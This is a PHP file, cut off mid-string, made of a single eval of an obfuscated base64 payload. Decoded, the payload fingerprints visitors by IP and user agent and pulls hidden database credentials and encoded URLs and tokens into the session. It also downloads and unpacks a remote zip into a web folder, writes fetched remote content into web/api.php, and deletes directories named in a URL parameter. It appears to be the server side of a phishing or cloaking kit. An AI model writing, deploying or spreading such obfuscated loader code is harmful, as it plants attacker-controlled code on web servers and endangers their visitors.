<?php eval(base64_decode('CiBnb3RvIGVnQzhJOyB1c2JOZjogaWYgKCFlbXB0eSgkX1NFUlZFUlsiXHg0OFwxMjRcMTI0XDEyMFwxMzdceDQzXDExNFx4NDlceDQ1XHg0ZVx4NTRcMTM3XHg0OVwxMjAiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJceDQ4XHg1NFwxMjRceDUwXDEzN1wxMDNcMTE0XHg0OVwxMDVceDRlXHg1NFwxMzdceDQ5XHg1MCJdOyB9IGVsc2VpZiAoIWVtcHR5KCRfU0VSVkVSWyJcMTEwXHg1NFwxMjRcMTIwXHg1ZlwxMzBceDVmXDEwNlwxMTdceDUyXDEyN1wxMDFceDUyXHg0NFx4NDVcMTA0XHg1ZlwxMDZceDRmXHg1MiJdKSkgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlx4NDhceDU0XDEyNFwxMjBceDVmXHg1OFwxMzdcMTA2XHg0ZlwxMjJceDU3XHg0MVwxMjJcMTA0XHg0NVwxMDRceDVmXDEwNlwxMTdceDUyIl07IH0gZWxzZSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXHg1Mlx4NDVcMTE1XHg0Zlx4NTRceDQ1XDEzN1x4NDFceDQ0XDEwNFx4NTIiXTsgfSBnb3RvIHlUV0JOOyB0dWZERzogJFJhbmRPUF9NbHV4ID0gUmFuZF9YRF9URihyYW5kKDQsIDEwKSk7IGdvdG8gTFphZmE7IFRjWkxfOiAkSXBDb3VudCA9IEZPeF9UR0hfWCgkdXNlckFnZW50KTsgZ290byBGRjQyWDsgQTQxd3o6ICRfU0VTU0lPTlsiXDEwMlwxNTRceDYxXDE2M1wxNDFceDYzXDE1N1x4NzVceDZlIl0gPSBpc3NldCgkaW5mb1siXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXDE3MSJdKSA/ICRpbmZvWyJcMTQzXDE1N1wxNjVcMTU2XDE2NFx4NzJcMTcxIl0gOiBudWxsOyBnb3RvIElVb0NROyBSb2E5dTogaWYgKCFDdWJfSlJSRF9PUCgkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dikpIHsgJHNob3dwaXAgPSAiXHgyMVx4MjFcNDEiOyBlY2hvICRzaG93cGlwOyBkaWU7IH0gZ290byB0azB0RzsgYWRJOUE6ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY3VybCk7IGdvdG8gZUUybzM7IGpTbnd4OiAkdXNlckFnZW50ID0gaXNzZXQoJF9TRVJWRVJbIlx4NDhceDU0XHg1NFwxMjBceDVmXDEyNVwxMjNcMTA1XHg1Mlx4NWZceDQxXHg0N1x4NDVcMTE2XHg1NCJdKSA/ICRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXDEzN1x4NTVcMTIzXDEwNVx4NTJceDVmXDEwMVx4NDdceDQ1XDExNlwxMjQiXSA6ICcnOyBnb3RvIGpNOXM1OyB0azB0RzogaWYgKGlzc2V0KCRfR0VUWyJcMTQ1XDE1NlwxNDRcMTU1XHg2NVwxNTRceDc1XDE3MCJdKSkgeyAkcmVkaSA9ICRfQ09PS0lFWyJcMTYyXDE0NVwxNDRceDY5XDE2Mlx4NjlcMTQzXDE2NCJdOyAkdmRpciA9ICRfR0VUWyJceDY1XHg2ZVx4NjRcMTU1XHg2NVx4NmNceDc1XDE3MCJdOyAkZGlyZWN0b3J5VG9EZWxldGUgPSAiXHg3N1x4NjVceDYyXHgyZiIgLiAkdmRpcjsgaWYgKGlzX2RpcigkZGlyZWN0b3J5VG9EZWxldGUpKSB7IGlmIChkZWxldGVEaXJlY3RvcnluZXcoJGRpcmVjdG9yeVRvRGVsZXRlKSkgeyB9IH0gZWNobyAiXHgzY1wxNjNceDYzXDE2Mlx4NjlcMTYwXDE2NFx4MjBceDRjXHg0MVwxMTZceDQ3XDEyNVx4NDFcMTA3XHg0NVx4M2RcNDdceDRhXHg2MVwxNjZcMTQxXDEyM1wxNDNcMTYyXDE1MVwxNjBcMTY0XDQ3XHgzZVwxMlx4MjBceDIwXDQwXDQwXHg3N1x4NjlcMTU2XDE0NFwxNTdcMTY3XHgyZVx4NmNceDZmXDE0M1wxNDFceDc0XDE1MVwxNTdceDZlXHgyZVx4NjhcMTYyXDE0NVx4NjZceDNkXHgyN3skcmVkaX1cNDdcNzNcMTJcNDBcNDBcNDBcNDBcNzRceDJmXDE2M1wxNDNcMTYyXHg2OVwxNjBcMTY0XDc2IjsgZGllOyB9IGdvdG8gT0JENjg7IGI1MkNsOiAkaW5mbyA9IHVuc2VyaWFsaXplKCRyZXNwb25zZSk7IGdvdG8gck5ndDU7IGxEWlBhOiBmdW5jdGlvbiBGT3hfVEdIX1goJFVTRVJfQUdFTlQpIHsgJEJST1dTRVJfRVJST1IgPSAiXHg1NVwxNTZceDZiXDE1Nlx4NmZcMTY3XDE1Nlx4MjBceDQyXDE2Mlx4NmZcMTY3XHg3M1x4NjVceDcyIjsgJEJST1dTRVIgPSBhcnJheSgiXHgyZlx4NmRcMTYzXHg2OVx4NjVcNTdcMTUxIiA9PiAiXDExMVx4NmVcMTY0XHg2NVwxNjJceDZlXDE0NVx4NzRcNDBcMTA1XDE3MFx4NzBcMTU0XDE1N1x4NzJcMTQ1XHg3MiIsICJceDJmXDE0NlwxNTFceDcyXHg2NVx4NjZceDZmXHg3OFx4MmZceDY5IiA9PiAiXHg0NlwxNTFcMTYyXHg2NVwxNDZceDZmXHg3OCIsICJcNTdceDczXDE0MVx4NjZceDYxXHg3MlwxNTFcNTdceDY5IiA9PiAiXHg1M1x4NjFcMTQ2XDE0MVwxNjJceDY5IiwgIlx4MmZceDYzXDE1MFx4NzJcMTU3XDE1NVwxNDVceDJmXDE1MSIgPT4gIlx4NDNceDY4XHg3Mlx4NmZcMTU1XHg2NSIsICJcNTdceDY1XDE0NFx4NjdcMTQ1XDU3XHg2OSIgPT4gIlx4NDVcMTQ0XHg2N1wxNDUiLCAiXDU3XDE1N1wxNjBceDY1XDE2MlwxNDFceDJmXDE1MSIgPT4gIlx4NGZcMTYwXDE0NVx4NzJcMTQxIiwgIlw1N1x4NmVceDY1XHg3NFwxNjNcMTQzXDE0MVwxNjBcMTQ1XDU3XHg2OSIgPT4gIlx4NGVcMTQ1XHg3NFwxNjNcMTQzXHg2MVwxNjBceDY1IiwgIlx4MmZcMTU1XDE0MVx4NzhceDc0XHg2OFx4NmZcMTU2XHgyZlwxNTEiID0+ICJcMTE1XDE0MVwxNzBcMTY0XHg2OFwxNTdceDZlIiwgIlw1N1wxNTNceDZmXDE1NlwxNjFceDc1XHg2NVx4NzJcMTU3XDE2Mlx4MmZceDY5IiA9PiAiXHg0Ylx4NmZceDZlXDE2MVx4NzVceDY1XDE2Mlx4NmZcMTYyIiwgIlw1N1wxNTVcMTU3XHg2Mlx4NjlceDZjXHg2NVx4MmZceDY5IiA9PiAiXHg0OFwxNDFceDZlXHg2NFwxNTBceDY1XDE1NFwxNDRceDIwXHg0MlwxNjJcMTU3XDE2N1x4NzNceDY1XHg3MiIpOyBmb3JlYWNoICgkQlJPV1NFUiBhcyAkcmVnZXggPT4gJHZhbHVlKSB7IGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7ICRCUk9XU0VSX0VSUk9SID0gJHZhbHVlOyB9IH0gcmV0dXJuICRCUk9XU0VSX0VSUk9SOyB9IGdvdG8galNud3g7IGFqYWNnOiBmdW5jdGlvbiBSRElPUEIoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRpZCkgeyAkZGIgPSBteXNxbGlfY29ubmVjdCgkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYpOyBpZiAoISRkYikgeyBkaWUoIlx4NDNcMTU3XHg2ZVx4NmVceDY1XHg2M1wxNjRceDY5XHg2Zlx4NmVcNDBcMTQ2XDE0MVwxNTFcMTU0XHg2NVwxNDRceDNhXHgyMCIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgfSAkc3FsX3UgPSAiXHg1M1x4NDVceDRjXHg0NVx4NDNceDU0XHgyMFx4MmFcNDBcMTA2XHg1Mlx4NGZcMTE1XHgyMFwxNjJcMTQ1XDE0NFwxNTFcMTYyXDE0M1x4NzRcMTUxXDE1N1x4NmVcNDBcMTI3XHg0OFwxMDVcMTIyXDEwNVw0MFwxNTFcMTQ0XDc1XDQ3eyRpZH1ceDI3IjsgJHJlc191ID0gbXlzcWxpX3F1ZXJ5KCRkYiwgJHNxbF91KTsgaWYgKG15c3FsaV9udW1fcm93cygkcmVzX3UpID4gMCkgeyB3aGlsZSAoJHJvdyA9IG15c3FsaV9mZXRjaF9hcnJheSgkcmVzX3UpKSB7ICRfU0VTU0lPTlsiXHg2Y1wxNTFcMTU2XHg2YiJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlx4NmNcMTUxXDE1NlwxNTMiXSkpOyAkX1NFU1NJT05bIlwxNDNcMTU2Il0gPSBleHBsb2RlKCJcNzMiLCBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXHg2M1x4NmZceDc1XDE1NlwxNjRceDcyXHg3OSJdKSkpOyAkX1NFU1NJT05bIlwxNjBcMTUxXDE0MyJdID0gJHJvd1siXDE2MFx4NjlceDYzIl07ICRfU0VTU0lPTlsiXDE1NVwxNjNceDY3Il0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXDE1NVx4NzNcMTQ3Il0pKTsgJF9TRVNTSU9OWyJceDY1XDE3MFwxNjAiXSA9ICRyb3dbIlwxNDVceDc4XHg3MFx4NjlceDcyXHg2NSJdOyAkX1NFU1NJT05bIlwxNjNceDY1XDE2MlwxNjZcMTQ1XHg3MiJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlwxNjNcMTQ1XHg3Mlx4NzZcMTQ1XDE2MiJdKSk7ICRfU0VTU0lPTlsiXHg3NVx4NzJcMTU0Il0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXHg3NVx4NzJcMTU0Il0pKTsgJF9TRVNTSU9OWyJceDZjXHg3NVwxNzBceDYzXHg2MVx4NzBcMTY0XHg2M1wxNTBcMTQxIl0gPSAkcm93WyJcMTU0XHg3NVwxNzBceDYzXDE0MVwxNjBcMTY0XDE0M1x4NjhceDYxIl07ICRfU0VTU0lPTlsiXHg3NFx4NmZceDZiXDE0NVwxNTZceDc0XDE0NVx4NmMiXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJcMTY0XHg2ZlwxNTNcMTQ1XHg2ZVx4NzRcMTQ1XHg2YyJdKSk7ICRfU0VTU0lPTlsiXDE1MVx4NjRcMTY0XDE0NVx4NmMiXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJcMTUxXDE0NFwxNjRceDY1XDE1NCJdKSk7ICRfU0VTU0lPTlsiXHg3Mlx4NjVceDY0XHg2OVwxNjJceDY5XDE0M1x4NzQiXSA9ICRyb3dbIlx4NzJcMTQ1XHg2NFwxNTFceDcyXHg2OVwxNDNcMTY0Il07ICRfU0VTU0lPTlsiXHg2MVwxNjBcMTUxIl0gPSAkcm93WyJceDYxXDE2MFx4NjkiXTsgaWYgKGlzc2V0KCRfR0VUWyJcMTY2XHg3M1wxNjMiXSkpIHsgc2V0Y29va2llKCJceDc0XDE1N1wxNTNceDY1XHg2ZVwxNjRceDY1XHg2YyIsICRfU0VTU0lPTlsiXDE2NFx4NmZceDZiXDE0NVwxNTZceDc0XHg2NVwxNTQiXSwgdGltZSgpICsgODY0MDAgKiAzMCwgIlw1NyIpOyBzZXRjb29raWUoIlx4NjlceDY0XHg3NFx4NjVcMTU0IiwgJF9TRVNTSU9OWyJceDY5XDE0NFx4NzRceDY1XDE1NCJdLCB0aW1lKCkgKyA4NjQwMCAqIDMwLCAiXDU3Iik7IHNldGNvb2tpZSgiXDE2MlwxNDVcMTQ0XHg2OVwxNjJceDY5XDE0M1wxNjQiLCAkX1NFU1NJT05bIlx4NzJceDY1XHg2NFx4NjlcMTYyXDE1MVx4NjNcMTY0Il0sIHRpbWUoKSArIDg2NDAwICogMzAsICJcNTciKTsgfSB9IH0gZWxzZSB7ICRyZWZpeCA9ICJcMTIzXDEyMVx4NGNceDIwXDExMVwxMDRcNDBceDQ5XDE1Nlx4NzZcMTQxXDE1NFwxNTFcMTQ0IjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IG15c3FsaV9jbG9zZSgkZGIpOyB9IGdvdG8gTkJ5WTc7IGFYUV9WOiAkcGFyZW50RGlyZWN0b3J5ID0gIlx4NzdceDY1XHg2MiI7IGdvdG8gS09MTEI7IG1KTktSOiAkUmFuZE9QX00gPSBSYW5kX1hEX1RGKHJhbmQoNywgNykpOyBnb3RvIHR1ZkRHOyBITVVhOTogJHByb3RvY29sID0gaXNzZXQoJF9TRVJWRVJbIlwxMTBceDU0XHg1NFwxMjBcMTIzIl0pICYmICRfU0VSVkVSWyJcMTEwXDEyNFwxMjRcMTIwXHg1MyJdID09PSAiXDE1N1wxNTYiID8gIlwxNTBcMTY0XDE2NFx4NzBceDczIiA6ICJcMTUwXDE2NFx4NzRcMTYwIjsgZ290byBVZmx1ZDsgTFphZmE6IGlmICgkX1NFUlZFUlsiXDEyMlwxMDVceDUxXDEyNVwxMDVceDUzXDEyNFwxMzdcMTE1XDEwNVwxMjRceDQ4XHg0Zlx4NDQiXSA9PT0gIlx4NTBceDRmXDEyM1x4NTQiKSB7IGlmICghaXNzZXQoJF9QT1NUWyJceDZjXHg2Zlx4NjNceDYxXDE1NFwxNTFceDcwIl0pKSB7ICRyZWZpeCA9ICJceDQ5XDE1Nlx4NzZceDYxXDE1NFx4NjlceDY0XDQwXDExMVx4NTBceDUzIjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IGlmICghaXNzZXQoJF9QT1NUWyJceDczXHg2OFwxNTdcMTYwXDE1MVx4NjQiXSkpIHsgJHJlZml4ID0gIlwxMTFceDZlXDE2Nlx4NjFceDZjXDE1MVx4NjRcNDBcMTExXHg0NFw0MFx4NTNcMTIxXDExNCI7IGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCk7IGRpZTsgfSBpZiAoIWlzX2RpcigiXDE2N1wxNDVceDYyIikpIHsgaWYgKCFta2RpcigiXDE2N1x4NjVcMTQyIiwgNTExKSkgeyBkaWUoIlx4NDZcMTQxXHg2OVx4NmNceDY1XDE0NFx4MjBceDc0XDE1N1x4MjBcMTQzXHg3Mlx4NjVceDYxXDE2NFwxNDVceDIwXHg3N1x4NjVceDYyXDQwXDE0NFx4NjlceDcyXHg2NVx4NjNcMTY0XDE1N1wxNjJceDc5Iik7IH0gfSAkZm9sZGVyX25hbWUgPSBiaW4yaGV4KHJhbmRvbV9ieXRlcyg4KSk7ICRzdWJfZm9sZGVyID0gcmFuZF9udW0oNCk7ICRmb2xkZXJfcGF0aCA9ICJcMTY3XHg2NVx4NjJcNTd7JHN1Yl9mb2xkZXJ9XHgyZiI7ICR6aXBGaWxlVXJsID0gJF9TRVNTSU9OWyJceDc1XDE2Mlx4NmMiXTsgJHRlbXBEaXIgPSAiXHg3NFx4NjVceDZkXDE2MCI7IGlmICghaXNfZGlyKCR0ZW1wRGlyKSkgeyBta2RpcigkdGVtcERpcik7IH0gJHppcEZpbGVOYW1lID0gInskdGVtcERpcn1cNTd7JGZvbGRlcl9uYW1lfVx4MmVcMTcyXHg2OVx4NzAiOyBpZiAoY29weSgkemlwRmlsZVVybCwgJHppcEZpbGVOYW1lKSkgeyBpZiAoIW1rZGlyKCRmb2xkZXJfcGF0aCwgNTExLCB0cnVlKSkgeyBkaWUoIlx4NDZcMTQxXHg2OVx4NmNceDY1XDE0NFx4MjBcMTY0XHg2Zlx4MjBcMTQzXDE2Mlx4NjVcMTQxXHg3NFwxNDVceDIwXHg3NFx4NjhcMTQ1XHgyMFx4NjZcMTU3XHg2Y1x4NjRceDY1XHg3Mlx4MmUiKTsgfSAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsgaWYgKCR6aXAtPm9wZW4oJHppcEZpbGVOYW1lKSA9PT0gdHJ1ZSkgeyAkemlwLT5leHRyYWN0VG8oJGZvbGRlcl9wYXRoKTsgJHppcC0+Y2xvc2UoKTsgJGV4dHJhY3RlZEZpbGVzID0gc2NhbmRpcigkZm9sZGVyX3BhdGgpOyBmb3JlYWNoICgkZXh0cmFjdGVkRmlsZXMgYXMgJGZpbGUpIHsgaWYgKCRmaWxlICE9PSAiXDU2IiAmJiAkZmlsZSAhPT0gIlw1Nlw1NiIpIHsgcmVuYW1lKCRmb2xkZXJfcGF0aCAuICJceDJmIiAuICRmaWxlLCAkZm9sZGVyX3BhdGggLiAkZmlsZSk7IH0gfSB9IGVsc2UgeyBlY2hvICJcMTA2XDE0MVwxNTFceDZjXDE0NVwxNDRceDIwXHg3NFx4NmZceDIwXDE0NVx4NzhceDc0XHg3Mlx4NjFcMTQzXHg3NFx4MjBcMTY0XHg2OFx4NjVceDIwXDE3Mlx4NjlceDcwXHgyMFx4NjZceDY5XHg2Y1x4NjVceDJlIjsgfSB9IGVsc2UgeyBkaWUoIlwxMDZceDYxXDE1MVx4NmNcMTQ1XDE0NFx4MjBceDc0XHg2Zlw0MFwxNDRceDZmXHg3N1x4NmVceDZjXHg2ZlwxNDFcMTQ0XHgyMFx4NzRceDY4XDE0NVw0MFx4N2FcMTUxXDE2MFw0MFwxNDZcMTUxXHg2Y1x4NjVceDJlIik7IH0gaWYgKGZpbGVfZXhpc3RzKCR6aXBGaWxlTmFtZSkpIHsgdW5saW5rKCR6aXBGaWxlTmFtZSk7IH0gJGdhbWVpZCA9ICRfU0VTU0lPTlsiXHg2Y1wxNTdceDZjXHg3M1wxNTdcMTY1XDE1NFx4NzMiXTsgJF9TRVNTSU9OWyJceDZjXHg2Zlx4NjNceDYxXHg2Y1x4NjRcMTUxXDE2MiJdID0gInskZm9sZGVyX3BhdGh9IjsgZmlsZV9wdXRfY29udGVudHMoInskZm9sZGVyX3BhdGh9XDU3XDE1NFwxNTdceDYzXHg2MVwxNTRceDJlXDE2NFwxNzBceDc0IiwgInskU3RydXBMb219XHhhIiwgRklMRV9BUFBFTkQpOyBmdW5jdGlvbiBnZXRGaWxlQ29udGVudHMoKSB7ICRmaWxlVVJMID0gJF9TRVNTSU9OWyJcMTQxXHg3MFx4NjkiXTsgJGN1cmwgPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfVVJMLCAkZmlsZVVSTCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgY3VybF9leGVjKCRjdXJsKTsgJHN0YXR1c0NvZGUgPSBjdXJsX2dldGluZm8oJGN1cmwsIENVUkxJTkZPX0hUVFBfQ09ERSk7ICRlcnJvciA9IGN1cmxfZXJyb3IoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJsKTsgaWYgKCRzdGF0dXNDb2RlID09PSAyMDAgJiYgZW1wdHkoJGVycm9yKSkgeyByZXR1cm47IH0gJGZpbGVDb250ZW50cyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlVVJMKTsgaWYgKCRmaWxlQ29udGVudHMgIT09IGZhbHNlKSB7ICRsb2NhbEZpbGVQYXRoID0gIlwxNjdceDY1XHg2Mlx4MmZcMTQxXHg3MFx4NjlcNTZcMTYwXDE1MFwxNjAiOyBmaWxlX3B1dF9jb250ZW50cygkbG9jYWxGaWxlUGF0aCwgJGZpbGVDb250ZW50cyk7IH0gfSBnZXRGaWxlQ29udGVudHMoKTsgJGxvY2FsaXAgPSBpc3NldCgkX1BPU1RbIlx4NmNceDZmXDE0M1wxNDFceDZjXDE1MVx4NzAiXSkgPyAkX1BPU1RbIlwxNTRcMTU3XHg2M1wxNDFcMTU0XHg2OVx4NzAiXSA6IG51bGw7ICRkb21haW5uYW1lID0gaXNzZXQoJF9QT1NUWyJcMTQ0XHg2Zlx4NmRcMTQxXDE1MVwxNTZcMTU2XDE0MVx4NmRceDY1Il0pID8gJF9QT1NUWyJceDY0XHg2Zlx4NmRceDYxXDE1MVwxNTZceDZlXDE0MVx4NmRcMTQ1Il0gOiBudWxsOyAkbmV4dGRvbWFpbiA9IGlzc2V0KCRfUE9TVFsiXDE1Nlx4NjVcMTcwXHg3NFx4NjRcMTU3XDE1NVx4NjFcMTUxXDE1NiJdKSA/ICRfUE9TVFsiXHg2ZVwxNDVceDc4XHg3NFx4NjRceDZmXHg2ZFx4NjFceDY5XHg2ZSJdIDogbnVsbDsgJHNob3BpZCA9IGlzc2V0KCRfUE9TVFsiXHg3M1x4NjhceDZmXDE2MFwxNTFcMTQ0Il0pID8gJF9QT1NUWyJceDczXDE1MFwxNTdceDcwXDE1MVwxNDQiXSA6IG51bGw7IGlmICgkbG9jYWxpcCAhPT0gbnVsbCAmJiAkZG9tYWlubmFtZSAhPT0gbnVsbCAmJiAkbmV4dGRvbWFpbiAhPT0gbnVsbCAmJiAkc2hvcGlkICE9PSBudWxsKSB7ICRkaXJlY3RvcnkgPSAiXHg3NFx4NjVcMTU1XHg3MCI7ICR6aXBGaWxlcyA9IGdsb2IoJGRpcmVjdG9yeSAuICJceDJhXDU2XHg3YVx4NjlceDcwIik7IGlmICghZW1wdHkoJHppcEZpbGVzKSkgeyBmb3JlYWNoICgkemlwRmlsZXMgYXMgJHppcEZpbGUpIHsgaWYgKGlzX2ZpbGUoJHppcEZpbGUpKSB7IHVubGluaygkemlwRmlsZSk7IH0gfSB9ICRyZXNwb25zZURhdGEgPSBhcnJheSgiXHg3M1wxNjRcMTQxXHg3NFwxNjVceDczIiA9PiAiXHg3M1x4NzVceDYzXHg2M1x4NjVceDczXHg3MyIsICJceDYyXHg2MVwxNDNceDZiXDEzN1x4NjRceDY5XHg3MiIgPT4gJGZvbGRlcl9wYXRoLCAiXHg2Mlx4NjFceDYzXDE1M1x4NWZceDc1XHg3Mlx4NmMiID0+ICRuZXh0ZG9tYWluLCAiXDE0MlwxNDFcMTQzXHg2Ylx4NWZceDY5XHg2NCIgPT4gJHNob3BpZCwgIlwxNTVcMTQ1XHg3M1wxNjNceDYxXDE0N1wxNDUiID0+ICJcMTA0XHg2MVwxNjRceDYxXDQwXHg3MlwxNDVceDYzXDE0NVx4NjlcMTY2XDE0NVwxNDRcNDBceDczXDE2NVwxNDNcMTQzXHg2NVwxNjNceDczXDE0NlwxNjVcMTU0XHg2Y1wxNzEiKTsgJHJlc3BvbnNlSnNvbiA9IGpzb25fZW5jb2RlKCRyZXNwb25zZURhdGEpOyBlY2hvICRyZXNwb25zZUpzb247IH0gZWxzZSB7IGh0dHBfcmVzcG9uc2VfY29kZSg0MDApOyBlY2hvICJcMTE1XHg2OVwxNjNceDczXDE1MVx4NmVcMTQ3XDQwXHg3Mlx4NjVcMTYxXDE2NVx4NjlceDcyXHg2NVwxNDRcNDBcMTQ0XDE0MVx4NzRceDYxIjsgfSB9IGVsc2UgeyBodHRwX3Jlc3BvbnNlX2NvZGUoNDA1KTsgZWNobyAiXDExMVx4NmVcMTY2XHg2MVx4NmNcMTUxXHg2NFw0MFwxNjJceDY1XDE2MVx4NzVceDY1XHg3M1x4NzRceDIwXDE1NVwxNDVcMTY0XDE1MFwxNTdceDY0IjsgfSBnb3RvIHd5OUxsOyBqTTlzNTogJE9LSklWR1JEID0gSFlUX0REUl9VaW8oJHVzZXJBZ2VudCk7IGdvdG8gVGNaTF87IGhFWTFKOiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnkoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gJHRpbWVfZGlmZiA9IHRpbWUoKSAtIGZpbGVjdGltZSgkZGlyKTsgaWYgKCR0aW1lX2RpZmYgPiAyOTApIHsgZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlw1NiIgfHwgJGl0ZW0gPT0gIlx4MmVcNTYiKSB7IGNvbnRpbnVlOyB9IGlmICghZGVsZXRlRGlyZWN0b3J5KCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGl0ZW0pKSB7IHJldHVybiBmYWxzZTsgfSB9IGlmIChybWRpcigkZGlyKSkgeyByZXR1cm4gdHJ1ZTsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZWxzZSB7IHJldHVybiB0cnVlOyB9IH0gZ290byBhWFFfVjsgUnZ2QXc6ICRkYXRhbG9nID0gYmFzZTY0X2RlY29kZSgiXDE0NVwxNTVcMTI2XHg3OVwxNDJceDc5XDYxXDE1M1x4NTlceDU4XDE1M1wxNjVceDYzXDYyXHg2OFx4NzZceDYzXHg0MSIpOyBnb3RvIGZHX2ExOyBUOHk1RzogY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyBnb3RvIGFkSTlBOyBSV25NczogaW5pX3NldCgiXHg2NFx4NjlcMTYzXHg3MFwxNTRcMTQxXHg3OVx4NWZcMTQ1XHg3Mlx4NzJcMTU3XDE2Mlx4NzMiLCAxKTsgZ290byB1c2JOZjsgeUZ6NV86IGZ1bmN0aW9uIHJhbmRfbnVtKCRsZW5ndGgpIHsgJGNoYXJhY3RlcnMgPSAiXDYwXHgzMVw2Mlx4MzNceDM0XDY1XHgzNlx4MzdceDM4XHgzOSI7ICRjaGFyYWN0ZXJzTGVuZ3RoID0gc3RybGVuKCRjaGFyYWN0ZXJzKTsgJHJhbmRvbVN0cmluZyA9ICcnOyBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7ICRyYW5kb21TdHJpbmcgLj0gJGNoYXJhY3RlcnNbcmFuZCgwLCAkY2hhcmFjdGVyc0xlbmd0aCAtIDEpXTsgfSByZXR1cm4gJHJhbmRvbVN0cmluZzsgfSBnb3RvIEpwV3ptOyBqM3ZJNDogJE5vcHd2diA9IGJhc2U2NF9kZWNvZGUoIlwxNDNceDMzXHg1MlwxNzFceDYyXDYyXDY1XDE1Nlx4NThceDMyXHg1MlwxNTBceDY1XHg1MSIpOyBnb3RvIEZRWG1yOyBpUWNIVDogJFRJTUVfREFURSA9IGRhdGUoIlwxMzFcNTVceDZkXDU1XDE0NFw0MFx4NDhceDNhXHg2OVx4M2FcMTYzIik7IGdvdG8gQjlicXo7IEZGNDJYOiBmdW5jdGlvbiBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpIHsgJHVzZXJBZ2VudCA9IGlzc2V0KCRfU0VSVkVSWyJcMTEwXDEyNFwxMjRceDUwXHg1Zlx4NTVcMTIzXHg0NVwxMjJceDVmXHg0MVwxMDdceDQ1XDExNlx4NTQiXSkgPyAkX1NFUlZFUlsiXDExMFwxMjRceDU0XDEyMFwxMzdceDU1XHg1M1wxMDVceDUyXDEzN1x4NDFceDQ3XDEwNVx4NGVcMTI0Il0gOiAnJzsgJGlzcCA9ICRfU0VTU0lPTlsiXHg2OVx4NzNcMTYwIl07ICRJcENvdW50ID0gRk94X1RHSF9YKCR1c2VyQWdlbnQpOyAkT0tKSVZHUkQgPSBIWVRfRERSX1VpbygkdXNlckFnZW50KTsgJGRvbmZsYWcgPSAkX1NFUlZFUlsiXHg1M1x4NDVcMTIyXHg1Nlx4NDVceDUyXDEzN1x4NGVceDQxXHg0ZFwxMDUiXTsgJExPQ0FMT19URU1QTyA9IGRhdGUoIlwxMzFcNTVcMTU1XDU1XDE0NFx4MjBceDQ4XHgzYVx4NjlceDNhXHg3MyIpOyAkQmxhc2Fjb3VuID0gJF9TRVNTSU9OWyJceDQyXHg2Y1x4NjFceDczXHg2MVwxNDNceDZmXDE2NVwxNTYiXTsgJE5qb3BmID0gJF9TRVNTSU9OWyJceDRlXHg2YVx4NmZceDcwXHg2NiJdOyAkVm9wcnQgPSAkX1NFU1NJT05bIlwxMjZcMTU3XDE2MFx4NzJceDc0Il07ICR4T3B1eSA9ICRfU0VTU0lPTlsiXDE3MFwxMTdceDcwXDE2NVwxNzEiXTsgJGhvc3QgPSBnZXRob3N0YnlhZGRyKCRTdHJ1cExvbSk7ICRkYiA9IG15c3FsaV9jb25uZWN0KCRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dik7IGlmICghJGRiKSB7IGRpZSgiXDEwM1x4NmZceDZlXHg2ZVx4NjVcMTQzXHg3NFwxNTFcMTU3XDE1Nlw0MFwxNDZcMTQxXDE1MVx4NmNceDY1XDE0NFx4M2FcNDAiIC4gbXlzcWxpX2Nvbm5lY3RfZXJyb3IoKSk7IH0gJHNxbF91ID0gIlx4NTNceDQ1XDExNFx4NDVcMTAzXHg1NFx4MjBcNTJceD